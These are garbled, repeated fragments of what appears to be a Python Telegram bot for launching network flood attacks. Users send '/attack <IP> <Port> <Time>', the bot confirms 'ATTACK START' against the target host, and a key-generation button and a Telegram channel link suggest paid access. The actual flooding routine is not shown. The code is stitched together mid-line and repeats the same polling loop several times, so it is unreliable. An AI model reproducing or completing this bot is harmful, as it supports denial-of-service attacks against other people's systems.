...
if __name__ == "__main__":
    ...
    while True:
        try:
            ...
            time.sleep(5)
    �� 𝗡𝗢𝗪: [Jᴏɪɴ Cʜᴀɴɴᴇʟ](https://t.me/+KLjoHUXoBGsxM2Rl)",
            parse_mode="Markdown"
        )
        return
...
if __name__ == "__main__":
    ...
    while True:
        try:
            ...
            logging.error(f"Polling error: {e}")
            time.sleep(5)arget_port, duration), loop)
        bot.reply_to(message, f"⚡ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 ⚡\n\n𝐇𝐎𝐒𝐓-> {target_ip}\n𝐏𝐎𝐑𝐓-> {target_port}\n𝐓𝐈𝐌𝐄-> {duration}")
    except Exception as e:
        logging.error(f"Error processing attack command: {e}")
        bot.reply_to(message, "🚀 Use /attack <Iᴘ> <Pᴏʀᴛ> <Tɪᴍᴇ>.")
...
if __name__ == "__main__":
    ...
    while True:
        try:
            ...
            logging.error(f"Polling error: {e}")
            time.sleep(5)essage.text == "GENKEY 🔑":
...
if __name__ == "__main__":
    ...
    while True:
        try:
            ...
            logging.error(f"Polling error: {e}")
            time.sleep(5).sleep(5).sleep(5).sleep(5)sleep(5)